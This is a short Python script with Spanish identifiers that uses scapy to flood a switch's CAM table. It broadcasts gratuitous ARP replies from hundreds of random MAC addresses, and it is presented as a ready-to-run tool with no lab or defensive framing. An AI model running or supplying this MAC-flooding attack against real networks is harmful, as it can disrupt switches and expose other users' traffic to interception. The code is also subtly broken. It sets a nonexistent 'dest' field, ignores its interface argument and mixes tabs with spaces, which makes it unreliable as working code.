#! /usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import random
import sys
import scapy.all as scapy

def generar_mac_aleatorias():
    return ( "52:54:00:%02x:%02x:%02x" % ( random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)) )   

def inundar_tabla_CAM( cantidad_mac ):
    arp_gratuito = scapy.ARP()
    destino = scapy.ARP().psrc
    ethernet = scapy.Ether()

    arp_gratuito.hwdst = "ff:ff:ff:ff:ff:ff"

    ethernet.dest = arp_gratuito.hwdst
    ethernet.type = 2054

    arp_gratuito.psrc = scapy.ARP().psrc
    arp_gratuito.op = 2
    arp_gratuito.pdst = arp_gratuito.psrc

    arp_gratuito.pdst = "255.255.255.255"

    for i in range(cantidad_mac):
        arp_gratuito.hwsrc = str(generar_mac_aleatorias())
        ethernet.src = arp_gratuito.hwsrc

        print(arp_gratuito.summary())

        paquete = ethernet/arp_gratuito
        scapy.sendp(paquete)

def main():

    parser = argparse.ArgumentParser(description = "Inundación tabla CAM")

    parser.add_argument('-i', '--interface', default='eth0', help='Nombre de la interfaz')
    parser.add_argument('-n', '--numero', type=int, default=500, help='Número de dirrecciones MAC a generar aleatoriamente')

    argumentos = parser.parse_args()

    try:
        cantidad_direcciones_mac = int(argumentos.numero)
        inundar_tabla_CAM(cantidad_direcciones_mac)
    except ValueError as error:
		print("Error: {0}".format(error))
		return 1

	return 0

if __name__ == '__main__':
	exit(main())


